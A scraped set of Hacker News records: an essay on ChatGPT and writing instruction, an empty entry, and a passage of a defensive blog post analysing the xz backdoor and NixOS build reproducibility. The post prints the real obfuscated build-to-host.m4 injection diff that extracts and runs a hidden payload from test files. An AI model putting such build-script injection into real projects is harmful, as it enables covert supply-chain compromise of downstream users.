[
  {
    "id": "2a1b9420575dba5b",
    "title": {
      "en": "ChatGPT can't kill anything worth preserving",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://biblioracle.substack.com/p/chatgpt-cant-kill-anything-worth",
    "score": 35,
    "by": "sandebert",
    "time": 1742710160,
    "content": "Share this postThe Biblioracle RecommendsChatGPT Can't Kill Anything Worth PreservingCopy linkFacebookEmailNotesMoreDiscover more from The Biblioracle RecommendsWeekly essays on reading the world and reading in the world, plus personalized book recommendations based on the last five books you've read.Over 8,000 subscribersSubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.Already have an account? Sign inChatGPT Can't Kill Anything Worth PreservingIf an algorithm is the death of high school English, maybe that's an okay thing.John WarnerDec 12, 202297Share this postThe Biblioracle RecommendsChatGPT Can't Kill Anything Worth PreservingCopy linkFacebookEmailNotesMore3711Share(Edit from 2/10/25: The post below is the first thing I wrote following the appearance of ChatGPT. A little over two years later I’ve compiled these and other sentiments into a book that is my attempt to describe and argue for what’s worth preserving. If the sentiments below are of interest to you, please consider checking out, More Than Words: How to Think About Writing in the Age of AI.—It’s not every week that someone with my particular employment profile and expertise has something they’re knowledgable about become a hot topic of national discussion, but the release of OpenAI’s, ChatGPT interface generated a sudden flurry of discussion about how we teach students to write in school, which is something I know a lot about.I’m never sure how much overlap there is for the various audiences that consist of the John Warner Writer Experience Universe, but while to folks here I am, “The Biblioracle,” book recommender par excellence, to a whole other group I am the author of Why They Can’t Write: Killing the Five-Paragraph Essay and Other Necessities, and The Writer’s Practice: Building Confidence in Your Nonfiction Writing, and a blogger about education issues at Inside Higher Ed.Modesty aside, and somewhat to my surprise, I have become an expert in how we teach writing. That expertise was birthed from the frustration I experienced in trying to teach writing to first-year college students over the years, and finding them increasingly disoriented by what I was asking them to do, as though there was no continuity between what they’d experienced prior to college, and what was expected of them in college.These were well-above average students at selective schools (University of Illinois, Virginia Tech, Clemson), who did not necessarily lack writing skill, but had very negative attitudes towards writing. To cut to the chase, and to keep from repeating everything I cover in Why They Can’t Write, rather than having students wrestle with the demands of trying to express themselves inside a genuine rhetorical situation (message/audience/purpose), they were instead producing writing-related simulations, utilizing prescriptive rules and templates (like the five-paragraph essay format), which passed muster on standardized tests, but did not prepare them for the demands of writing in college contexts. My books are a call to change how we approach teaching writing at both a systemic and pedagogical level. What teachers and schools ask students to do is not great, but that asking is bound up with the systems in which it happens, where teachers have too many students, or where grades or the score on an AP test are more important than actually learning stuff. It’s not just that we need to change how and what we teach. We have to fundamentally alter the spaces in which this teaching happens.It is difficult to overstate how bad things have been for a couple of generations of students. This tweet from the writer Lauren Groff (Matrix), lamenting what school had done to her son’s attitudes towards writing is a not uncommon testimony I hear from parents and students alike.Deep down, this is a question about what we value, in what we read, what we write, and unfortunately, we have attached a set of values to student writing that are disconnected from anything we actually value about what we read, and what we write.  Along with many others, I’ve been shouting about these problems for years, often into what felt like a void, but this past week, once people had a chance to see what the ChatGPT could produce, suddenly attention was being paid.ShareIt’s important to understand what ChatGPT is, as well as what it can do. ChatGPT is a Large Language Model (LLM) that is trained on a set of data to respond to questions in natural language. The algorithm does not “know” anything. All it can do is assemble patterns according to other patterns it has seen when prompted by a request. It is not programmed with the rules of grammar. It does not sort, or evaluate the content. It does not “read”; it does not write. It is, at its core, a bullshitter. You give it a prompt and it responds with a bunch of words that may or may not be responsive and accurate to the prompt, but which will be written in fluent English syntax.This snapshot from the ChatGPT homepage is a good overview of what OpenAI says ChatGPT can do. I first wrote about the underlying algorithm (GPT3) at Inside Higher Ed back in March 2021, when it was put to the task of trying to answer some college-level writing assignments and then compared to the output of human students answering the same questions. For three of the four subjects - research methods, U.S. history and law - the AI passed with a C or better grade. The top human scored better than the AI in each category, but in two categories (research methods, law), the AI beat one or more of the humans.The subject it tanked was creative writing. It would not tank creative writing anymore.At the top next to the purple icon is my prompt. Below that is ChatGPT’s response. It took about 60 seconds for it to process and produce the text.This is not good, exactly, but it also isn’t bad. It’s perfectly okay, not unlike the kind of thing that a student would produce in an introductory creative writing course. For a short story, that opening sentence is weird, but a clever student making a quick edit could excise it and improve the outcome immediately. In fact, a good overall editorial strategy would be to cut any line that’s explicitly in my prompt, so what remains is learned via inference. The weirdest part is perhaps the choice of song, as the upbeat spirit of the song and lyrics about a woman telling her partner not to be tempted by other girls doesn’t quite fit the scenario. It’s a good example of how the algorithm has no appreciation of meaning and context.The passage also lacks a sense of place and atmosphere. The descriptions are sterile. I’m going to fix that with an additional prompt.That’s actually starting to approach not bad. It’s not good, exactly, but in an introductory class, you don’t necessarily  expect good. Still, it’s lacking something. It feels rather generic, voiceless. Let’s see if I can help it out a bit:If you don’t know Molly Ivins, you should because she’s the best political commentary writer in the history of the genre, and she wrote in a very distinctive style. This doesn’t actually sound like Molly Ivins writing about politics, but the prompt is enough to inject some spark of life into the prose. You can see a couple of immediate improvements over the previous version. Compare these two sentences:Eight grade student, Sarah sat on her bed in her room, staring at the ceiling as she thought about Billy, the cute boy in her class.AndEighth-grader Sara was holed up in her room, trying to puzzle out the meaning of life, or at least the meaning of Billy, the cute boy in her math class.The latter is clearly better, more alive. “Holed up” and “puzzled out” are common phrasings, but clearly better than the generic language of the first example. And that line about puzzling out the “meaning of Billy” is downright good.You know who agrees with me about which is the better narrative? ChatGPT.If the AI can produce this, imagine what it can do with a canned prompt that you might commonly find in a literature-based high school English class, such as this one, from a sample AP Literature exam, “In many works of fiction, houses take on symbolic importance. Such houses may be literal houses or unconventional houses (e.g., hotels, hospitals, monasteries, or boats). Choose a work of fiction in which a literal or unconventional house serves as a significant symbol. Then, in a well-written essay, analyze how this house contributes to the interpretation of the work as a whole. Do not merely summarize the plot.”I won’t bore you by pasting the answer, because it’s not worth your time to read it, but it would easily receive the maximum score a 5, particularly given the fact that the AP graders do not pay any attention to whether or not the content of the answer is accurate or true.I cannot emphasize this enough: ChatGPT is not generating meaning. It is arranging word patterns. I could tell GPT to add in an anomaly for the 1970s - like the girl looking at Billy’s Instagram - and it would introduce it into the text without a comment about being anomalous. It is not entirely unlike the old saw about a million monkeys banging on a typewriter for along enough, that one of them would produce the works of Shakespeare through random chance, except this difference is, ChatGPT has been trained on a data set that eliminates all the gibberish.Many are wailing that this technology spells “the end of high school English,” meaning those classes where you read some books and then write some pro forma essays that show you sort of read the books, or at least the Spark Notes, or at least took the time to go to Chegg or Course Hero and grab someone else’s essay, where you changed a few words to dodge the plagiarism detector, or that you hired someone to write the essay for you. I sincerely hope that this is the end of the high school English courses that the lamentations are describing because these courses deserve to die, because we can do better than these courses if the actual objective of the courses is to help students learn to write.But now that this technology is in the world, and will be widely available, we must think about what high school English should look like going forward. I’ve been thinking about these things for years, so I have a head start on others, but let me be clear ChatGPT has not created a problem that wasn’t already present. SubscribeMake the work worth doing.One of the assumptions those who say this is the end of high school English make about students is that if students can find an end around doing the actual work of school, they will definitely take it.What does it say about what we ask students to do in school that we assume they will do whatever they can to avoid it?The final epiphany that cemented how wrong a turn we had made was the first time I stood in front of a class of first-year students on the second day1 of our writing course and I presented a hypothetical where I give them all A grades, but class would never meet, they would no no assignments, they would get no feedback or instruction. They would learn nothing. That first time I did it, about 60-65% of students said they'd take that deal. Disturbing.The last time I did it, six or seven years later, 85% said they'd take that deal.Disastrous.The students were not lazy or entitled. They were responding rationally to the incentives of the system. An A without learning anything was far more valuable than learning anything, and risking a grade lower than an A. School had nothing to do with learning, and writing courses especially were unlikely to be interesting or engaging.Well, I set out to prove students wrong, that there was writing worth doing, and over the years developed the curriculum that is collected in The Writer’s Practice in order to try to prove that. The experiences in the book are designed to be both intrinsically interesting, and to engender learning that is both visible to students and relevant to their lives. In my experience, students actually do want to learn stuff because students are people too. The problem is school has ceased to honor their humanity, instead substituting “student-ness.”First step, et’s give students something worth doing.Value the process, rather than the product.It is a mistake to think we can out-prompt the AI. There are some things the AI is not good at yet - for example, it is an inferior lyricist to Steve Miller (not exactly known for the quality of his lyrics) when provided all the rhyming words from “The Joker.”But for the typical school assignment, it reliably turns out passable results.I’ve tested some of the core prompts that I use in The Writer’s Practice. In isolation, some are vulnerable to ChatGPT, while others would be very difficult for it to pull off convincingly at this time, but based on the progress I’ve seen, I have little confidence that we can stay ahead of its ability to bullshit.But the reason why I’m confident my pedagogy is not vulnerable to ChatGPT is because I do not only grade the end product, but instead, value the process it takes to get there. I ask students to describe how and why they did certain things. I collect the work product that precedes the final document. I talk to the students, one-on-one about themselves, about their work. If we assume students want to learn - and I do - we should show our interest in their learning, rather than their performance.Unfortunately, for the vast majority of my career, I did not have the time or resources necessary to fulfill the highest aims of my own pedagogy. The National Council for Teachers of English (NCTE) recommends each instructor teach three sections of a maximum of fifteen students each, for a total of 45 students. I never had fewer than 65 students in a semester, and some semesters had in excess of 150. High school teachers are working under even greater burdens, and in more challenging circumstances. If the system will not support the teachers who must do the work, we may as well let ourselves be overwhelmed by the algorithm. Raise the bar by getting rid of traditional grading.The AI does not generate excellent work, particularly not without the kind of tweaking you see me doing above, tweaking which I can do because I possess a relatively sophisticated understanding of narrative craft and know what to tell the AI to do. A student doing an end run around school would likely accept the first thing the bot gives it, turn it in, and hope for the best. It’s similar to how plagiarists are easy to catch. They’re not diligent enough to cover up their perfidy.2 But part of the problem is that we - and very much including myself here - have been conditioned to reward surface-level competence (like fluent prose) with a grade slike a C+, B-, or B. We may have to get used to not rewarding pro forma work that goes through the motions with passing grades, or it may mean finding other elements of the experience to focus on in terms of grading.This process of “ungrading” or alternative grading has been gaining significant momentum in recent years, and I think it is a promising way of figuring out what is meaningful to students and what kinds of approaches help them learn. For those who are curious about this movement, I recommend Susan Blum’s edited collection, Ungrading: Why Rating Students Undermines Learning (And What to Do Instead), but then again, I would because I wrote a chapter in it on Wile E. Coyote as the hero of ungraders.Incorporate the AI into the work.Having played around with this stuff for only a few days, my thoughts are early and provisional, but I could see potential in crafting assignments that encourage and empower students to utilize the AI in their work. At his Substack, Lincoln Michel interviewed the author Chandler Klang Smith, about how she uses a similar technology, Sudowrite, to help produce her fiction. The AI could be used as a tool, or a toy in a way that opens up experiences of learning.I’m certain there’s people who are way ahead of me on how to do this well. I’ll be seeking them out and listening to what they have to say.ShareThe reason the appearance of this tech is so shocking is because it forces us to confront what we value, rather than letting the status quo churn along unexamined. I couldn’t do that while I was teaching because the way students were struggling made me feel like I was doing a terrible job, and I wanted to figure out how to do better.It’s possible that one of the things we (as in society collectively) will decide is that students don’t need to learn to write anymore, since we have technology that can do that for us. I think this would be a shame because one of the things I value about writing, is the act of writing itself. It is an embodied process that connects me to my own humanity, by putting me in touch with my mind, the same way a vigorous hike through the woods can put me in touch with my body. For me, writing is simultaneously expression and exploration. In a piece like this, writing is the expression and exploration of an idea (or collection of ideas). It is only through the writing that I can fully understand what I think. With fiction, for me, writing is the expression and exploration of for lack of a better word: life. Towards the end of my novel, The Funny Man, my narrator says, “Everyone’s got a story, and the best ones are those we tell ourselves.” That was a little Easter Egg I put in the text before I had any notion that it would one day be published as a reminder of how interesting it was to solve the puzzle of writing a novel. It is in the mouth of my narrator, but the sentiment is mine. Writing is rewarding. Writing is empowering. Writing is even fun. As human, we are wired to communicate. We are also wired for “play.” Under the right circumstances, writing allows us to do both of these things at the same time.It is not an impossible challenge to make this universe of experience accessible to students. We know much about what has to be done already.It’s really a matter of whether or not we will decide to do it.Exciting addendum on my response to ChatGPTSince I first published this newsletter, I’ve been working on a course of instructors who assign writing that is designed to help them do their work in a world where ChatGPT exists. More info on the course and how to access it is available at this link right here.Teaching Writing in an AI WorldLeave a commentLinksIf you’re curious and want to read more reactions to ChatGPT, I recommend this piece from Ian Bogost on how we should see it a “a toy, not a tool.” The New York Times podcast “Hard Fork” asks, “Can ChatGPT make this podcast?” This piece by Stephen Johnson is a good one if you want to know more about how ChatGPT does what it does. Writing at Slate, Alex Kantrowitz says that Google has a chat bot that’s even better than ChatGPT, but releasing it disrupts their own search business model.In my Chicago Tribune column this week, I share my favorite nonfiction and memoir of 2022, including Ancestor Trouble by Maud Newtonwhich I wrote about in an earlier newsletter when I asked \"How do you know if a book is true?\" Also included is Foreverland: On the Divine Tedium of Marriage by Heather Havrileskywhich I swear every married (or unmarried) person should read as a route to improving their own perspective on matrimony. Here’s a quick, music-themed quiz from the Times. I only got four out of five on this one, breaking my perfect streak on these quizzes.Donna Barba Higuera, winner of this year’s Newberry Medal for children’s literature for The Last Cuentista, provides a list of her five favorite children’s books of 2022.CrimeReads has released their list of best crime novels of 2022, while the Times has their take on the best true crime books of the year.Brittle Paper introduces us to 100 notable African books from this year.RecommendationsNo requests in the queue, but let me remind everyone that all links to books from this newsletter go to Bookshop.org, and any affiliate income generated is donated to Open Books in Chicago. Affiliate income is at $321.30 for the year. We’ve already topped last year’s total of $308.10, but what the heck, why not get to $400 before the year is out. As a reminder, I’m matching up to $500 of affiliate income.Occasional more detailed plea for paid subscriptionsFrom the start, this newsletter has run on a patron, rather than consumer model, where I would keep the content free, while asking those who can afford and are inclined to support the project with paid subscriptions to do so. It’s gone really well, as far as I’m concerned, but I was recently provided some data about how much more I would be earning if I put at least some of the content behind a paywall, and well…it is quite a bit more. At the same time, putting posts behind a paywall would reduce the size of my readership, and my primary motive behind maintaining this space is to be read by a community of people interested in some of the same things I’m interested in, so I’m not going to put up a paywall, at least not for these weekly main posts.But if you do like this newsletter and you can spare the subscription money to support it, I will be incredibly grateful, and the rest of the community thanks you as well.SubscribeAlrighty, time to go have a Sunday. You probably won’t be hearing from me next week because I’m traveling home to see family and I want to spend time with them, rather than tap tapping on the computer machine, but I have a new installment of “A Book I Wish More People Knew About” that will be coming your way.JWThe Biblioracle1I’d always do this on the 2nd day, after I’d introduced them to the class and my teaching philosophy so I could get an honest answer.2Because of how I grade the writing process than merely the final artifact, I didn’t have a plagiarism case for the last decade or so of my full-time teaching career, but the appearance of “perfidy” in a student essay was a red flag for something that had been copied, as the semi-clever plagiarist will copy another text, and then using the thesaurus function on their word processor, substitute some synonyms for a handful of words, in order to throw of any search attempts. In order to catch these students back in the day, I would write out all the words from an essay that I suspected had been thesaurasized and ask the student to define them on the spot. Sort of mean, but effective.Subscribe to The Biblioracle RecommendsBy John Warner · Hundreds of paid subscribersWeekly essays on reading the world and reading in the world, plus personalized book recommendations based on the last five books you've read.SubscribeBy subscribing,  I agree to Substack's Terms of Use, and acknowledge its Information Collection Notice and Privacy Policy.97 Likes∙11 Restacks97Share this postThe Biblioracle RecommendsChatGPT Can't Kill Anything Worth PreservingCopy linkFacebookEmailNotesMore3711Share",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e3fa46eac06efa4b",
    "title": {
      "en": "Improving recommendation systems and search in the age of LLMs",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://eugeneyan.com/writing/recsys-llm/",
    "score": 104,
    "by": "7d7n",
    "time": 1742701205,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3f187cff992325c8",
    "title": {
      "en": "NixOS and reproducible builds could have detected the xz backdoor",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://luj.fr/blog/how-nixos-could-have-detected-xz.html",
    "score": 258,
    "by": "birdculture",
    "time": 1742672399,
    "content": "How NixOS and reproducible builds could have detected the xz backdoor\nfor the benefit of all\n\n            Published on 2025-03-20\n\n            Estimated reading time: 22mn\n\n            Introduction\nIn March 2024, a backdoor was discovered in xz, a (de)-compression software that is regularly used at the core of Linux distributions to unpack source tarballs of packaged software. The backdoor had been covertly inserted by a malicious maintainer under the pseudonym of Jia Tan over a period of three years. This event deeply stunned the open source community as the attack was both of massive impact (it allowed remote code execution on all affected machines that had ssh installed) and extremely difficult to detect. In fact, it was only thanks to the diligence (and maybe luck) of Andres Freund – a Postgres developer working at Microsoft – that the catastrophe was avoided: while investigating a seemingly unrelated 500ms performance regression in ssh that he was experiencing on several Debian unstable machines, he was able to trace it back to the liblzma library, identify the backdoor and document it.\nWhile it was already established that the open source supply chain was often the target of malicious actors, what is stunning is the amount of energy invested by Jia Tan to gain the trust of the maintainer of the xz project, acquire push access to the repository and then among other perfectly legitimate contributions insert – piece by piece – the code for a very sophisticated and obfuscated backdoor. This should be a wake up call for the OSS community. We should consider the open source supply chain a high value target for powerful threat actors, and to collectively find countermeasures against such attacks.\nIn this article, I’ll discuss the inner workings of the xz backdoor and how I think we could have mechanically detected it thanks to build reproducibility.\nHow does the attack work?\nThe main intent of the backdoor is to allow for remote code execution on the target by hijacking the ssh program. To do that, it replaces the behavior of some of ssh’s functions (most importantly the RSA_public_decrypt one) in order to allow an attacker to execute arbitrary commands on a victim’s machine when some specific RSA key is used to log in. Two main pieces are combined to put together to install and activate the backdoor:\n\nA script to de-obfuscate and install a malicious object file as part of the xz build process.\nInterestingly the backdoor was not comprehensively contained in the source code for xz. Instead, the malicious components were only contained in tarballs built and signed by the malicious maintainer Jia Tan and published alongside releases 5.6.0 and 5.6.1 of xz. This time the additional release tarball contained slight and disguised modifications to extract a malicious object file from the .xz files used as data for some test contained in the repository.\nA procedure to hook the RSA_public_decrypt function. The backdoor uses the ifunc mechanism of glibc to modify the address of the RSA_public_function when ssh is loaded, in case ssh links against liblzma through libsystemd.\n\n  Info\n\n  The rest of this section goes into the details of the two steps mentionned. Reading it is not necessary to understand the rest of the article. The most important takeaway here is that the backdoor was only active when using the maintainer-provided release tarball.\n\n1. A script to de-obfuscate and install a malicious object file as part of the xz build process\nAs explained above, the malicious object file is stored directly in the xz git repository, hidden in some test files. The project being a decompression software, test cases include .xz files to be decompressed, making it possible to hide some machine code into fake test files;\nThe backdoor is not active in the code contained in the git repository, it is only included by building xz from the tarball released by the project, which has a few differences with the actual contents of the repository, most importantly in the m4/build-to-host.m4 file.\ndiff --git a/m4/build-to-host.m4 b/m4/build-to-host.m4\nindex f928e9ab..d5ec3153 100644\n--- a/m4/build-to-host.m4\n+++ b/m4/build-to-host.m4\n@@ -1,4 +1,4 @@\n-# build-to-host.m4 serial 3\n+# build-to-host.m4 serial 30\n dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.\n dnl This file is free software; the Free Software Foundation\n dnl gives unlimited permission to copy and/or distribute it,\n@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],\n\n   dnl Define somedir_c.\n   gl_final_[$1]=\"$[$1]\"\n+  gl_[$1]_prefix=`echo $gl_am_configmake | sed \"s/.*\\.//g\"`\n   dnl Translate it from build syntax to host syntax.\n   case \"$build_os\" in\n     cygwin*)\n@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],\n   if test \"$[$1]_c_make\" = '\\\"'\"${gl_final_[$1]}\"'\\\"'; then\n     [$1]_c_make='\\\"$([$1])\\\"'\n   fi\n+  if test \"x$gl_am_configmake\" != \"x\"; then\n+    gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'\n+  else\n+    gl_[$1]_config=''\n+  fi\n+  _LT_TAGDECL([], [gl_path_map], [2])dnl\n+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl\n+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl\n+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl\n+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl\n   AC_SUBST([$1_c_make])\n+\n+  dnl If the host conversion code has been placed in $gl_config_gt,\n+  dnl instead of duplicating it all over again into config.status,\n+  dnl then we will have config.status run $gl_config_gt later, so it\n+  dnl needs to know what name is stored there:\n+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt=\"eval \\$gl_[$1]_config\"])\n ])\n\n dnl Some initializations for gl_BUILD_TO_HOST.\n AC_DEFUN([gl_BUILD_TO_HOST_INIT],\n [\n+  dnl Search for Automake-defined pkg* macros, in the order\n+  dnl listed in the Automake 1.10a+ documentation.\n+  gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null`\n+  if test -n \"$gl_am_configmake\"; then\n+    HAVE_PKG_CONFIGMAKE=1\n+  else\n+    HAVE_PKG_CONFIGMAKE=0\n+  fi\n+\n   gl_sed_double_backslashes='s/\\\\/\\\\\\\\/g'\n   gl_sed_escape_doublequotes='s/\"/\\\\\"/g'\n+  gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'\n changequote(,)dnl\n   gl_sed_escape_for_make_1=\"s,\\\\([ \\\"&'();<>\\\\\\\\\\`|]\\\\),\\\\\\\\\\\\1,g\"\n changequote([,])dnl\n\nWhile these changes may look benign to the naive eyes and well commented, they are actually hiding a chain of commands that decrypts/deobfuscates several fake .xz test files to ultimately produce two files:\n\na shell script that is run during the build of xz ;\na malicious binary object file.\n\nThere is an excellent analysis from Russ Cox that explains in detail how these two malicious resources are produced during the build process, and I advise any interested reader to find all relevant details there.\nThe shell script run during the build has two main purposes:\n\nVerifying that the conditions to execute the backdoor are met on the builder (the backdoor targets specific Linux distributions, needs specific features of the glibc activated, needs ssh installed, etc) ;\nModifying the (legitimate) liblzma_la-crc64_fast.o to use the _get_cpuid symbol defined in the backdoor object file.\n\n2. A procedure to hook the RSA_public_decrypt function\nSo how does a backdoor in the xz executable have any effect on ssh?\nTo understand that, we have to take a little detour in the realm of dynamic loaders and dynamically linked programs. Whenever a program depends on a library, there are two ways that library can be linked into the final executable:\n\nstatically, in that case the library is embedded into the final executable, hence increasing its size ;\ndynamically, in which case it is the role of the dynamic loader (ld-linux.so in Linux) to find that shared library when the program starts and load it in memory.\n\nWhen a program is compiled using dynamic linking, the addresses of the symbols belonging to dynamically linked libraries cannot be provided at compilation time: their position in memory is not know ahead of time! Instead, a reference to the Global Offset Table (or GOT) is inserted. When the program is started, the actual addresses are filled in the GOT by the dynamic linker.\nThe xz backdoor uses a functionality of the glibc called ifunc to force execution of code during dynamic loading time: ifunc is designed to allow selection between several implementations of the same function at dynamic loading time.\n#include <stdio.h>\n\n// Declaration of ifunc resolver function\nint (*resolve_add(void))(int, int);\n\n// First version of the add function\nint add_v1(int a, int b) {\n    printf(\"Using add_v1\\n\");\n    return a + b;\n}\n\n// Second version of the add function\nint add_v2(int a, int b) {\n    printf(\"Using add_v2\\n\");\n    return a + b;\n}\n\n// Resolver function that chooses the correct version of the function\nint (*resolve_add(void))(int, int) {\n    // You can implement any runtime check here.\n    // In that case we check if the system is 64bit\n    if (sizeof(void*) == 8) {\n        return add_v2;\n    } else {\n        return add_v1;\n    }\n}\n\n// Define the ifunc attribute for the add function\nint add(int a, int b) __attribute__((ifunc(\"resolve_add\")));\n\nint main() {\n    int result = add(10, 20);\n    printf(\"Result: %d\\n\", result);\n    return 0;\n}\n\nIn the above example, the ifunc attribute surrounding the add function indicates that the version that will be executed will be determined at dynamic loading time by running the resolve_add function. In that case, the resolve_add function returns add_v1 or add_v2 depending if the running system is a 64 bit system or not – and as such is completely harmless – but this technique is used by the xz backdoor to run some malicious code at dynamic loading time.\nBut dynamic loading of which program? Well, of ssh! In some Linux distributions (Debian and Fedora for example), ssh is patched to support systemd notifications and for this purpose, links with libsystemd, that in turn links with liblzma. In those distribution sshd hence has a transitive dependency on liblzma.\n\nDependency chain between sshd and liblzma\n\nThis is how the backdoor works: whenever sshd is executed, the dynamic loader loads libsystemd and then liblzma. With the backdoor installed, and leveraging the ifunc functionality as explained above, the backdoor is able to run arbitrary code when liblzma is being loaded. Indeed, as you remember from the previous section, the backdoor script modifies one of the legitimate xz object files: it actually modifies the resolver of one of the functions that uses ifunc to call its own malicious _get_cpuid symbol. When called, this function meddles with the GOT (that is not yet read-only at this time of execution) to modify the address of the RSA_public_decrypt function, replacing it by a malicious one! That’s it, at this point sshd uses the malicious RSA_public_decrypt function that gives RCE privileges to the attacker.\nOnce again, there exist more precise reports on exactly how the hooking happens that a curious reader might read, like this one for example. There is also a research article summarizing the attack vector and possible mitigations that I recommend reading.\nAvoiding the xz catastrophe in the future\nWhat should our takeaways be from this near-miss and what should we do to minimize the risks of such an attack happening again in the future? Obviously, there is a lot to be said about the social issues at play here1 and how we can build better resilience in the OSS ecosystem against malicious entities taking over really fundamental OSS projects, but in this piece I’ll only address the technical aspects of the question.\nPeople are often convinced that OSS is more trustworthy than closed-source software because the code can be audited by practitioners and security professionals in order to detect vulnerabilities or backdoors. In this instance, this procedure has been made difficult by the fact that part of the code activating the backdoor was not included in the sources available within the git repository but was instead present in the maintainer-provided tarball. While this was used to hide the backdoor out of sight of most investigating eyes, this is also an opportunity for us to improve our software supply chain security processes.\nBuilding software from trusted sources\nOne immediate observation that we can make in reaction to this supply chain incident is that it was only effective because a lot of distributions were using the maintainer provided tarball to build xz instead of the raw source code supplied by the git forge (in this case, GitHub). This reliance on release tarballs has plenty of historical and practical reasons:\n\nthe tarball workflow predates the existence of git and was used in the earliest Linux distributions;\ntarballs are self-contained archives that encapsulate the exact state of the source code intended for release while git repositories can be altered, creating the need for a snapshot of the code;\ntarballs can contain intermediary artifacts (for example manpages) used to lighten the build process, or configure scripts to target specific hardware, etc;\ntarballs allow the source code to be compressed which is useful for space efficiency.\n\nThis being said, these reasons do not weigh enough in my opinion to justify the security risks they create. In all places where it is technically feasible, we should build software from sources authenticated by the most trustworthy party. For example, if a project is developed on GitHub, an archive is automatically generated by GitHub for each release. The risk of a compromise of that release archive is far lower than the risk of a malicious maintainer distributing unfaithful tarballs, as it would require compromising the GitHub infrastructure (and at this point the problem is much more serious). This reasoning can be extended in all cases where the development is happening on a platform operated by a trusted third party like Codeberg/SourceHut/Gitlab, etc.\nWhen the situation allows it…\nNixOS is a distribution built on the functional package management model, that is to say every package is encoded as an expression written in Nix, a functional programming language. A Nix expression for a software project is usually a function mapping all the project dependencies to a “build recipe” that can be later executed to build the package. I am a NixOS developer and I was surprised when the backdoor was revealed to see that the malicious version of xz had ended up being distributed to our users2. While there is no policy about this, there is a culture among NixOS maintainers of using the source archive automatically generated by GitHub (that are simply snapshots of the source code) when available through the fetchFromGitHub function. In the simplified example of the xz package below, you can see that the sources for the package are actually extracted from the manually uploaded malicious maintainer provided tarball through another source fetcher: fetchurl.\n{ lib, stdenv, fetchurl\n, enableStatic ? stdenv.hostPlatform.isStatic\n}:\n\nstdenv.mkDerivation rec {\n  pname = \"xz\";\n  version = \"5.6.0\";\n\n  src = fetchurl {\n    url = \"https://github.com/tukaani-project/xz/releases/download/v${version}/xz-${version}.tar.xz\";\n    hash = \"sha256-AWGCxwu1x8nrNGUDDjp/a6ol4XsOjAr+kncuYCGEPOI=\";\n  };\n...\n}\n\nTo understand why, we must first talk about the bootstrap of nixpkgs. The concept of a bootstrap is the idea that one could rebuild all of the packages in nixpkgs from a small set of seed binaries. This is an important security property because it means that there are no other external tools that one must trust in order to trust the toolchain that is used to build the software distribution. What we call the “bootstrap” in the context of a software distribution like nixpkgs, is all the steps needed to build the basic compilation environment to be used by other packages, called stdenv in nixpkgs. Building stdenv is not an easy task; how does one build gcc when one doesn’t even have a C compiler? The answer is that you start from a very small binary that does nothing fancy but is enough to build hex, a minimalist assembler, which in turn can build a more complex assembler, and this until we are able to build more complex software and finally a modern C compiler. The bootstraping story of Nix/Guix is an incredibly interesting topic, that I will not cover extensively here, but I strongly advise reading blog posts from the Guix community, that are on the bleeding edge (they have introduced a 357-byte bootstrap that is being adapted for nixpkgs).\nWhat does all that has to do with xz though? Well, xz is included in the nixpkgs bootstrap!\n$ nix-build -A stdenv\n/nix/store/91d27rjqlhkzx7mhzxrir1jcr40nyc7p-stdenv-linux\n$ nix-store --query --graph result\n\nWe can see now that stdenv depends at runtime on xz, so it is indeed built during the bootstrap stage. To understand a bit more why this is the case, I’ll also generate a graph of the software in stdenv that depends on xz at buildtime.\n$ nix-store --query --graph $(nix-eval --raw -f default stdenv.drvPath)\n\nWe can see that several packages depend on xz. Let’s take coreutils for example and try to understand why it depends on xz by reading its derivation file, which is the intermediary representation of the build process obtained by evaluating the Nix expression for coreutils:\n{\n  \"/nix/store/57hlz5fnvfgljivf7p18fmcl1yp6d29z-coreutils-9.5.drv\": {\n    \"args\": [\n      \"-e\",\n      \"/nix/store/v6x3cs394jgqfbi0a42pam708flxaphh-default-builder.sh\"\n    ],\n    \"builder\": \"/nix/store/razasrvdg7ckplfmvdxv4ia3wbayr94s-bootstrap-tools/bin/bash\",\n\n      ...\n\n    \"inputDrvs\": {\n\n      ...\n\n      \"/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv\": {\n        \"dynamicOutputs\": {},\n        \"outputs\": [\n          \"bin\"\n        ]\n      },\n      \"/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv\": {\n        \"dynamicOutputs\": {},\n        \"outputs\": [\n          \"out\"\n        ]\n      }\n    },\n\n    ...\n\n    \"system\": \"x86_64-linux\"\n  }\n}\n\nThe inputDrvs field here correspond to all the other packages or expressions that the coreutils build process depends on. We see that in particular it depends on two components:\n\n/nix/store/c0wk92pcxbxi7579xws6bj12mrim1av6-xz-5.6.2.drv, which is xz itself;\n/nix/store/xv4333kfggq3zn065a3pwrj7ddbs4vzg-coreutils-9.5.tar.xz.drv which is a source archive for coreutils! As it is a .xz archive, we need xz to unpack it and that is where the dependency comes from!\n\nThe same reasoning applies to the other three direct dependencies that we could see in the graph earlier.\nxz being built as part of the bootstrap means it doesn’t have access to all the facilities normal packages in nixpkgs can rely on. In particular it can only access packages that are built before in bootstrap. For example, to build xz from sources, we need autoconf to generate the configure script. But autoconf has a dependency on xz! Using the maintainer tarball allows us to break this dependency cycle.\n$ nix why-depends --derivation nixpkgs#autoconf 